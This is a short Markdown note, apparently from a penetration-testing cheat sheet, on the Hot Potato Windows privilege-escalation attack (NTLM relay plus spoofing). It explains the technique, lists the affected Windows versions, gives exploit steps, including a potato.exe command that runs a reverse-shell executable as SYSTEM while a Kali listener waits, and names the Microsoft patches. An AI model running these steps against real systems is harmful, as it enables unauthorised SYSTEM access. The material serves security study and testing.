# Hot Potato
Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges.
The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.

***This attack works on Windows 7, 8, early versions of Windows 10, win Server 2008, and Server 2012. and their server counterparts.***

![hot potato](https://jlajara.gitlab.io/assets/images/posts/20201122/Diagram_1.png)

To understand deeper this technique, the researchers post/video are recommended:

- [https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)
- [https://www.youtube.com/watch?v=8Wjs__mWOKI](https://www.youtube.com/watch?v=8Wjs__mWOKI)

***exploit***
(Note: These steps are for Windows 7)
Download the binary from the repository: https://github.com/foxglovesec/Potato
1. Copy the potato.exe exploit executable over to Windows.
2. Start a listener on Kali.
3. Run the exploit:
`.\potato.exe -ip <local ip> -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
4. Wait for a Windows Defender update, or trigger one manually.


***Is this vulnerability exploitable right now?***

Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a challenge that is already in flight. What this means is that **SMB->SMB NTLM relay from one host back to itself will no longer work**. MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). **WAPD MITM Attack is patched.**